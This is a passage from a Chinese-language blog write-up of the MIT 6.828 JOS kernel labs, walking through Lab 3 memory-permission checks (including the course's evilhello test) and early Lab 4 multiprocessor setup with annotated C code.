class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">page_fault_handler</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Trapframe *tf)</span><br>&#123;<br><span class="hljs-type">uint32_t</span> fault_va;<br><br><span class="hljs-comment">// Read processor&#x27;s CR2 register to find the faulting address</span><br>fault_va = rcr2();<br><br><span class="hljs-comment">// Handle kernel-mode page faults.</span><br><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><br><span class="hljs-comment">// check whether it happened in kernel mode or not</span><br><span class="hljs-keyword">if</span> (!(tf-&gt;tf_cs &amp; <span class="hljs-number">0b11</span>))<br>panic(<span class="hljs-string">&quot;kernel page fault!&quot;</span>);<br><br><span class="hljs-comment">// We&#x27;ve already handled kernel-mode exceptions, so if we get here,</span><br><span class="hljs-comment">// the page fault happened in user mode.</span><br><br><span class="hljs-comment">// Destroy the environment that caused the fault.</span><br>cprintf(<span class="hljs-string">&quot;[%08x] user fault va %08x ip %08x\n&quot;</span>,<br>curenv-&gt;env_id, fault_va, tf-&gt;tf_eip);<br>print_trapframe(tf);<br>env_destroy(curenv);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="user-mem-check-：检查用户地址合法性">user_mem_check()：检查用户地址合法性</h4><p>最后是修改 <code>user_mem_check()</code>，主要是以下两点：</p><ul><li>检查地址是否落在用户空间</li><li>检查页表项，用户是否有相应权限</li></ul><p>这里需要注意的是可能发生的整型溢出导致的地址回绕：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Check that an environment is allowed to access the range of memory</span><br><span class="hljs-comment">// [va, va+len) with permissions &#x27;perm | PTE_P&#x27;.</span><br><span class="hljs-comment">// Normally &#x27;perm&#x27; will contain PTE_U at least, but this is not required.</span><br><span class="hljs-comment">// &#x27;va&#x27; and &#x27;len&#x27; need not be page-aligned; you must test every page that</span><br><span class="hljs-comment">// contains any of that range.  You will test either &#x27;len/PGSIZE&#x27;,</span><br><span class="hljs-comment">// &#x27;len/PGSIZE + 1&#x27;, or &#x27;len/PGSIZE + 2&#x27; pages.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// A user program can access a virtual address if (1) the address is below</span><br><span class="hljs-comment">// ULIM, and (2) the page table gives it permission.  These are exactly</span><br><span class="hljs-comment">// the tests you should implement here.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// If there is an error, set the &#x27;user_mem_check_addr&#x27; variable to the first</span><br><span class="hljs-comment">// erroneous virtual address.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Returns 0 if the user program can access this range of addresses,</span><br><span class="hljs-comment">// and -E_FAULT otherwise.</span><br><span class="hljs-comment">//</span><br><span class="hljs-type">int</span><br><span class="hljs-title function_">user_mem_check</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Env *env, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *va, <span class="hljs-type">size_t</span> len, <span class="hljs-type">int</span> perm)</span><br>&#123;<br><span class="hljs-comment">// LAB 3: Your code here.</span><br><br><span class="hljs-type">uint32_t</span> start, end;<br><span class="hljs-type">pte_t</span> *pte;<br><br>start = ((<span class="hljs-type">uint32_t</span>) va) &amp; (~(PGSIZE - <span class="hljs-number">1</span>));<br>end = ROUNDUP(((<span class="hljs-type">uint32_t</span>) va) + len, PGSIZE);<br><br><span class="hljs-keyword">for</span> (; start &lt; end; start += PGSIZE)<br>&#123;<br>pte = pgdir_walk(env-&gt;env_pgdir, (<span class="hljs-type">void</span>*)start, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> ((!pte) || (start &gt;= ULIM) || !(*pte &amp; PTE_P) || ((*pte &amp; perm) != perm))<br>&#123;<br>user_mem_check_addr =  (start &lt; (<span class="hljs-type">uint32_t</span>)va ? (<span class="hljs-type">uint32_t</span>)va : start);<br><span class="hljs-keyword">return</span> -E_FAULT;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后是修改 <code>debuginfo_eip()</code>，在 <code>usd</code>, <code>stabs</code>, <code>stabstr</code> 这三个地方加上 <code>user_mem_check()</code> 进行地址合法性检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">// Make sure this memory is valid.</span><br><span class="hljs-comment">// Return -1 if it is not.  Hint: Call user_mem_check.</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><span class="hljs-keyword">if</span> (user_mem_check(curenv, (<span class="hljs-type">void</span>*)usd, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> UserStabData), PTE_U))<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>stabs = usd-&gt;stabs;<br>stab_end = usd-&gt;stab_end;<br>stabstr = usd-&gt;stabstr;<br>stabstr_end = usd-&gt;stabstr_end;<br><br><span class="hljs-comment">// Make sure the STABS and string table memory is valid.</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><span class="hljs-keyword">if</span> (user_mem_check(curenv, (<span class="hljs-type">void</span>*)stabs, stab_end - stabs, PTE_U))<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br><span class="hljs-keyword">if</span> (user_mem_check(curenv, (<span class="hljs-type">void</span>*)stabstr, stabstr_end - stabstr, PTE_U))<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>最后是 Exercise 10，防止 evilhello 导致 kernel panic</p><blockquote><p><strong>Exercise 10.</strong> Boot your kernel, running <code>user/evilhello</code>. The environment should be destroyed, and the kernel should not panic. You should see:</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">[<span class="hljs-number">00000000</span>] new env <span class="hljs-number">00001000</span><br>...<br>[<span class="hljs-number">00001000</span>] user_mem_check assertion failure for va f010000c<br>[<span class="hljs-number">00001000</span>] free env <span class="hljs-number">00001000</span><br></code></pre></td></tr></table></figure></blockquote><p>我们先看 <code>user/evilhello.c</code> ，里面为系统调用 <code>sys_cputs()</code> 传递了一个内核空间中的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// evil hello world -- kernel pointer passed to kernel</span><br><span class="hljs-comment">// kernel should destroy user environment in response</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inc/lib.h&gt;</span></span><br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">umain</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-comment">// try to print the kernel entry point as a string!  mua ha ha!</span><br>sys_cputs((<span class="hljs-type">char</span>*)<span class="hljs-number">0xf010000c</span>, <span class="hljs-number">100</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>因此我们只需要在对应系统调用加上地址合法性检查即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Print a string to the system console.</span><br><span class="hljs-comment">// The string is exactly &#x27;len&#x27; characters long.</span><br><span class="hljs-comment">// Destroys the environment on memory errors.</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">sys_cputs</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br><span class="hljs-comment">// Check that the user has permission to read memory [s, s+len).</span><br><span class="hljs-comment">// Destroy the environment if not.</span><br><br><span class="hljs-comment">// LAB 3: Your code here.</span><br>user_mem_assert(curenv, s, len, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// Print the string supplied by the user.</span><br>cprintf(<span class="hljs-string">&quot;%.*s&quot;</span>, len, s);<br>&#125;<br></code></pre></td></tr></table></figure><p>运行评分程序，我们成功通过了所有测试，拿到满分</p><p><img src="https://s2.loli.net/2022/03/17/Xo6q4wWvFJptYzl.png" alt="image.png"></p><p>至此， lab3 全部完成</p><h1>0x04. Lab 4: Preemptive Multitasking</h1><p>在 lab4 中我们将实现抢占式多任务调度</p><p>首先还是先 commit lab3 的代码，把 lab4 分支拉下来：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git add .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git commit -m <span class="hljs-string">&quot;lab3&quot;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git checkout -b lab4 origin/lab4</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git merge lab3</span><br></code></pre></td></tr></table></figure><p>在 lab4 当中新增了如下文件：</p><table><thead><tr><th><code>kern/cpu.h</code></th><th>Kernel-private definitions for multiprocessor support</th></tr></thead><tbody><tr><td><code>kern/mpconfig.c</code></td><td>Code to read the multiprocessor configuration</td></tr><tr><td><code>kern/lapic.c</code></td><td>Kernel code driving the local APIC unit in each processor</td></tr><tr><td><code>kern/mpentry.S</code></td><td>Assembly-language entry code for non-boot CPUs</td></tr><tr><td><code>kern/spinlock.h</code></td><td>Kernel-private definitions for spin locks, including the big kernel lock</td></tr><tr><td><code>kern/spinlock.c</code></td><td>Kernel code implementing spin locks</td></tr><tr><td><code>kern/sched.c</code></td><td>Code skeleton of the scheduler that you are about to implement</td></tr></tbody></table><h2 id="Part-A-Multiprocessor-Support-and-Cooperative-Multitasking">Part A: Multiprocessor Support and Cooperative Multitasking</h2><p>在本 lab 的第一部分，我们将扩展 JOS 以让其能运行在一个多处理器系统上，并实现一些系统调用以允许用户级的进程创建新的进程；我们同时还将实现 <em>协作式的</em> 轮询调度（round-robin scheduling），允许内核在当前进程自愿放弃CPU 时进行进程调度；在 Part C 中我们还将实现 <em>抢占式</em> 的调度，其允许内核在一段时间后重新获取 CPU 的控制权</p><h3 id="Multiprocessor-Support">Multiprocessor Support</h3><p>我们将让 JOS 支持”对称式多处理“（symmetric multiprocessing）——一种所有 CPU 都有对系统资源同等的权限的多处理器模型。在引导过程中，SMP 中的 CPU 可以分为两种：由一个引导处理器（bootstrap processor，BSP）负责系统的初始化与启动工作，剩余的应用处理器（application processors，APs）则在系统运行之后再由 BSP 唤醒。而由哪个 CPU 来作为 BSP 则是由硬件与 BIOS 决定的。</p><p>在 SMP 系统中，每个 CPU 都附带有一个本地 APIC （LAPIC）单元，其不仅负责分发中断，还负责为其连接的 CPU 提供一个标识符，本次实验我们将利用 LAPIC 单元的下列基本功能（参见 <code>kern/lapic.c</code>）</p><ul><li>读取 LAPIC ID 以识别代码当前运行的 CPU（参见 <code>cpunum()</code>）</li><li>从 BSP 向 APs 发送 <code>STARTUP</code> 这一处理器间中断（interprocessor interrupt）以将其唤醒（参见 <code>lapic_startap()</code>）</li><li>在 part C 中，我们对 LAPIC 的内置计时器进行编程以触发时钟中断从而支持抢占式多任务（参见 <code>apic_init()</code>）</li></ul><blockquote><p><strong>Exercise 1.</strong> Implement <code>mmio_map_region</code> in <code>kern/pmap.c</code>. To see how this is used, look at the beginning of <code>lapic_init</code> in <code>kern/lapic.c</code>. You’ll have to do the next exercise, too, before the tests for <code>mmio_map_region</code> will run.</p></blockquote><p>处理器通过 MMIO 访问其 LAPIC：一部分物理内存被<strong>硬连线</strong>到部分 IO 设备的寄存器上，因此我们可以使用普通的存取指令来访问设备寄存器，相应地这块内存便是一个内存空洞。LAPIC 对应的内存空洞则在<strong>物理地址</strong> <code>0xFE000000</code> 处，占用 32 MB，我们无法通过基于 <code>KERNBASE</code> 的线性映射进行访问（超出 32 位地址了），但 JOS 在 <code>MMIOBASE</code> 处留了 4MB 的空白所以我们可以映射到此处</p><p>接下来是 Exercise 1，让我们实现 <code>mmio_map_region()</code></p><blockquote><p><strong>Exercise 1.</strong> Implement <code>mmio_map_region</code> in <code>kern/pmap.c</code>. To see how this is used, look at the beginning of <code>lapic_init</code> in <code>kern/lapic.c</code>. You’ll have to do the next exercise, too, before the tests for <code>mmio_map_region</code> will run.</p></blockquote><p>这个函数主要的作用就是将指定的物理内存映射到对应的虚拟内存上，只不过目标是 mmio 内存，直接使用我们之前写的 <code>boot_map_region()</code> 即可，以页为单位从 <code>MMIOBASE</code> 开始映射，若剩余的留给 MMIO 的区域不够则 panic，这里别忘了页表项标志位应设为 <code>PTE_W | PTE_PCD | PTE_PWT</code> （可写 &amp;&amp; 禁用高速缓存 &amp;&amp; 页级通写位）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Reserve size bytes in the MMIO region and map [pa,pa+size) at this</span><br><span class="hljs-comment">// location.  Return the base of the reserved region.  size does *not*</span><br><span class="hljs-comment">// have to be multiple of PGSIZE.</span><br><span class="hljs-comment">//</span><br><span class="hljs-type">void</span> *<br><span class="hljs-title function_">mmio_map_region</span><span class="hljs-params">(<span class="hljs-type">physaddr_t</span> pa, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br><span class="hljs-comment">// Where to start the next region.  Initially, this is the</span><br><span class="hljs-comment">// beginning of the MMIO region.  Because this is static, its</span><br><span class="hljs-comment">// value will be preserved between calls to mmio_map_region</span><br><span class="hljs-comment">// (just like nextfree in boot_alloc).</span><br><span class="hljs-type">static</span> <span class="hljs-type">uintptr_t</span> base = MMIOBASE;<br><br><span class="hljs-comment">// Reserve size bytes of virtual memory starting at base and</span><br><span class="hljs-comment">// map physical pages [pa,pa+size) to virtual addresses</span><br><span class="hljs-comment">// [base,base+size).  Since this is device memory and not</span><br><span class="hljs-comment">// regular DRAM, you&#x27;ll have to tell the CPU that it isn&#x27;t</span><br><span class="hljs-comment">// safe to cache access to this memory.  Luckily, the page</span><br><span class="hljs-comment">// tables provide bits for this purpose; simply create the</span><br><span class="hljs-comment">// mapping with PTE_PCD|PTE_PWT (cache-disable and</span><br><span class="hljs-comment">// write-through) in addition to PTE_W.  (If you&#x27;re interested</span><br><span class="hljs-comment">// in more details on this, see section 10.5 of IA32 volume</span><br><span class="hljs-comment">// 3A.)</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Be sure to round size up to a multiple of PGSIZE and to</span><br><span class="hljs-comment">// handle if this reservation would overflow MMIOLIM (it&#x27;s</span><br><span class="hljs-comment">// okay to simply panic if this happens).</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint: The staff solution uses boot_map_region.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Your code here:</span><br><br>size = ROUNDUP(pa + size, PGSIZE);<br>pa = ROUNDDOWN(pa, PGSIZE);<br>size -= pa;<br><span class="hljs-keyword">if</span> ((base + size) &gt; MMIOLIM || (base + size) &lt; MMIOBASE)<br>panic(<span class="hljs-string">&quot;Run out of MMIO region!&quot;</span>);<br><br>boot_map_region(kern_pgdir, base, size, pa, PTE_W | PTE_PCD | PTE_PWT);<br>base += size;<br><span class="hljs-keyword">return</span> (<span class="hljs-type">void</span>*)(base - size);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Application-Processor-Bootstrap">Application Processor Bootstrap</h4><p>在启动 APs 之前 BSP 应当收集多处理器系统的相关信息，例如 CPU 总数、APIC IDs 以及 LAPIC 单元的 MMIO 地址，<code>mp_init()</code> 函数通过读取 BIOS 的内存区中的 MP 配置表来获取这些信息；在<code>boot_aps()</code> 中将 APs 启动（实模式），并将 AP 入口代码拷贝到一个实模式下可寻址的内存区域，不同于 bootloader，我们可以控制 APs 开始执行代码的位置，我们将入口代码复制到 0x7000 （<code>MPENTRY_PADDR</code>）处，不过其实任何 640KB 以下的未使用的页对齐的物理地址都可以被使用</p><p>之后 <code>boot_aps()</code> 通过向每一个 APs 的 LAPIC 单元发送 <code>STARTUP</code> IPI 以唤醒他们，其中包含有入口点的地址，在经过简单的设置之后 每个 AP 都将进入开启分页的保护模式，并调用 <code>mp_main()</code> 函数；<code>boot_aps()</code> 会等到每个被唤醒的 AP 在设置自己对应的 <code>struct CpuInfo</code> 中的 <code>cpu_status</code> 域的 <code>CPU_STARTED</code> 标志位后才会接着唤醒下一个</p><p>接下来是 Exercise 2，阅读启动过程的代码并修改 <code>page_init()</code> 以避免将 <code>MPENTRY_ADDR</code> 对应的页也链到 freelist 上</p><blockquote><p><strong>Exercise 2.</strong> Read <code>boot_aps()</code> and <code>mp_main()</code> in <code>kern/init.c</code>, and the assembly code in <code>kern/mpentry.S</code>. Make sure you understand the control flow transfer during the bootstrap of APs. Then modify your implementation of <code>page_init()</code> in <code>kern/pmap.c</code> to avoid adding the page at <code>MPENTRY_PADDR</code> to the free list, so that we can safely copy and run AP bootstrap code at that physical address. Your code should pass the updated <code>check_page_free_list()</code> test (but might fail the updated <code>check_kern_pgdir()</code> test, which we will fix soon).</p></blockquote><p>首先拜读一下 <code>boot_aps()</code>，逻辑还是比较简单的，主要就是拷贝启动代码到 0x7000，之后通过 <code>lapic_startap()</code> 唤醒单个 AP 并进行忙等待直到其设置自己的 <code>CPU_STARTED</code> 标志位，而 <code>mp_main()</code> 则主要是将内核页表装载到 AP 自己的 cr3 上，以及初始化自己的环境、IDT、从运行队列中取出进程（后面这些都需要我们在后续实现）</p><p>我们直接看修改 <code>page_init()</code>，如果在建 freelist 时对每一张内存页都进行一次判断那就太耗时了，笔者的选择是等到 freelist 建完之后再将对应页进行脱链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">page_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">// LAB 4:</span><br><span class="hljs-comment">// Change your code to mark the physical page at MPENTRY_PADDR</span><br><span class="hljs-comment">// as in use</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">mpentry</span>, *<span class="hljs-title">mp_prev</span>;</span><br>    <br>    <span class="hljs-comment">//...</span><br>    <br>    <span class="hljs-comment">// 5) mark the physical page at MPENTRY_PADDR as in use</span><br>mpentry = pa2page(MPENTRY_PADDR);<br>mp_prev = pa2page(MPENTRY_PADDR + PGSIZE);<br>mp_prev-&gt;pp_link = mpentry-&gt;pp_link;<br>mpentry-&gt;pp_ref = <span class="hljs-number">1</span>;<br>mpentry-&gt;pp_link = <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来是习题：</p><blockquote><p><strong>Question</strong></p><ol><li>Compare <code>kern/mpentry.S</code> side by side with <code>boot/boot.S</code>. Bearing in mind that <code>kern/mpentry.S</code> is compiled and linked to run above <code>KERNBASE</code> just like everything else in the kernel, what is the purpose of macro <code>MPBOOTPHYS</code>? Why is it necessary in <code>kern/mpentry.S</code> but not in <code>boot/boot.S</code>? In other words, what could go wrong if it were omitted in <code>kern/mpentry.S</code>?<br>Hint: recall the differences between the link address and the load address that we have discussed in Lab 1.</li></ol></blockquote><p><code>MPBOOTPHYS</code> 宏主要的作用就是计算 entry code 中需要用到的地址的<strong>真实物理地址</strong>，因为 entry code 在被链接进内核二进制文件后其地址不一定是 0x7000 起始，但是我们将其加载到了该位置，因此对于绝对地址的索引需要计算其加载到该地址上之后的地址</p><h4 id="Per-CPU-State-and-Initialization">Per-CPU State and Initialization</h4><p>对于一个多处理器 OS 而言我们很有必要为每个 CPU 都分配一块私有空间（例如 Linux 中的 percpu 变量），我们可以分配一个数组并使用 <code>cpunum()</code> 获取到 CPU 标号作为下标索引，以下是我们应当注意的 per-CPU state：</p><ul><li><p><strong>Per-CPU kernel stack</strong>.</p><p>每个 CPU 都应当有属于其自己的堆栈，在 JOS 中数组 <code>percpu_kstacks[NCPU][KSTKSIZE]</code> 为每个 CPU 保留一份自己的堆栈区域；正如在 lab2 中我们将 BSP 的堆栈映射到了 KSTACKTOP 下，在本 lab 中我们将为每个 CPU 创建自己的堆栈，且应确保其堆栈占用一块连续的虚拟内存区域</p></li><li><p><strong>Per-CPU TSS and TSS descriptor</strong>.</p><p>我们同样需要一个 per-CPU 任务状态段来确定每个 CPU 的内核栈的位置，每个 CPU 的 TSS 被存放在 <code>cpus[i].cpu_ts</code> 中，对应的 TSS descriptor 则在 <code>gdt[(GD_TSS0) &gt;&gt; 3] + i]</code> ，定义于 <code>kern/trap.c</code> 中的全局变量 <code>ts</code> 则不再使用</p></li><li><p><strong>Per-CPU current environment pointer</strong>.</p><p>因为每个 CPU 都可以独立运行用户进程，因此我们将符号 <code>curenv</code> 重定义为 <code>cpus[cpunum()].cpu_env</code> ，指向运行在当前 CPU 上进程的 PCB</p></li><li><p><strong>Per-CPU system registers</strong>.</p><p>所有的寄存器对一个 CPU 而言都是私有的，因此我们还需要在每个 CPU 上都初始化其 cr3、gdt、idt…</p></li></ul><p>接下来是 Exercise 3，修改 <code>mem_init_mp()</code> 以为每个 CPU 分配一个内核栈</p><blockquote><p><strong>Exercise 3.</strong> Modify <code>mem_init_mp()</code> (in <code>kern/pmap.c</code>) to map per-CPU stacks starting at <code>KSTACKTOP</code>, as shown in <code>inc/memlayout.h</code>. The size of each stack is <code>KSTKSIZE</code> bytes plus <code>KSTKGAP</code> bytes of unmapped guard pages. Your code should pass the new check in <code>check_kern_pgdir()</code>.</p></blockquote><p>直接用 <code>boot_map_region</code> 创建映射即可，注意这里不管我们有多少个 CPU 都要建立 <code>NCPU</code> 个内核栈（这个时候 <code>ncpu</code> 变量还没初始化，而且整个 <code>percpu_kstack</code> 数组的大小是在编译期确定的）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Modify mappings in kern_pgdir to support SMP</span><br><span class="hljs-comment">//   - Map the per-CPU stacks in the region [KSTACKTOP-PTSIZE, KSTACKTOP)</span><br><span class="hljs-comment">//</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">mem_init_mp</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">// Map per-CPU stacks starting at KSTACKTOP, for up to &#x27;NCPU&#x27; CPUs.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// For CPU i, use the physical memory that &#x27;percpu_kstacks[i]&#x27; refers</span><br><span class="hljs-comment">// to as its kernel stack. CPU i&#x27;s kernel stack grows down from virtual</span><br><span class="hljs-comment">// address kstacktop_i = KSTACKTOP - i * (KSTKSIZE + KSTKGAP), and is</span><br><span class="hljs-comment">// divided into two pieces, just like the single stack you set up in</span><br><span class="hljs-comment">// mem_init:</span><br><span class="hljs-comment">//     * [kstacktop_i - KSTKSIZE, kstacktop_i)</span><br><span class="hljs-comment">//          -- backed by physical memory</span><br><span class="hljs-comment">//     * [kstacktop_i - (KSTKSIZE + KSTKGAP), kstacktop_i - KSTKSIZE)</span><br><span class="hljs-comment">//          -- not backed; so if the kernel overflows its stack,</span><br><span class="hljs-comment">//             it will fault rather than overwrite another CPU&#x27;s stack.</span><br><span class="hljs-comment">//             Known as a &quot;guard page&quot;.</span><br><span class="hljs-comment">//     Permissions: kernel RW, user NONE</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// LAB 4: Your code here:</span><br><span class="hljs-type">int</span> i;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NCPU; i++)<br>&#123;<br>boot_map_region(kern_pgdir, <br>KSTACKTOP - i * (KSTKSIZE + KSTKGAP) - KSTKSIZE, <br>KSTKSIZE, <br>PADDR(&amp;percpu_kstacks[i]), <br>PTE_W);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来是 Exercise 4，更改 <code>trap_init_percpu()</code> 以让其能正常在所有 CPU 上运行</p><blockquote><p><strong>Exercise 4.</strong> The code in <code>trap_init_percpu()</code> (<code>kern/trap.c</code>) initializes the TSS and TSS descriptor for the BSP. It worked in Lab 3, but is incorrect when running on other CPUs. Change the code so that it can work on all CPUs. (Note: your new code should not use the global <code>ts</code> variable any more.)</p></blockquote><p>主要就是把全局变量 <code>ts</code> 替换成 <code>thiscpu</code> 指向的 <code>CpuInfo</code> 结构体的 <code>cpu_ts</code> 成员即可，以及修改全局段描述符表中对应段描述符为 tss 描述符时注意使用 <code>cpunum()</code> 来获取当前 CPU 的标号，还有就是注意将 tss 的 esp 初始化为对应 cpu 的栈，这里还要注意一点就是 <code>ltr</code> 指令所用的值应为 <em>对应的描述符在全局描述符表中的偏移</em> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 